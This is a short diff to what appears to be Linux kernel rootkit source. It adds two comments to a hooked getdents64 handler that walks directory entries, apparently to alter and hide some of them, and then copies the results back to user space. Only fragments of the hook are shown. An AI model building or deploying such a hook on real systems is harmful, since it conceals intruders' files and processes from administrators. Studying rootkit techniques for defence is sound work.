@@ -198,6 +198,7 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
 		/*&& MINOR(d_inode->i_rdev) == 1*/)
 		proc = 1;
 
+	// Changes which we will do
 	while (offset < ret)
 	{
 		dir = (void *)kdirent + offset;
@@ -219,6 +220,7 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
 		offset += dir->d_reclen;
 	}
 	
+	// Copying directory name (or pid name) from kernel space to user space, after changing
 	err = copy_to_user(dirent, kdirent, ret);
 	
 	if (err)
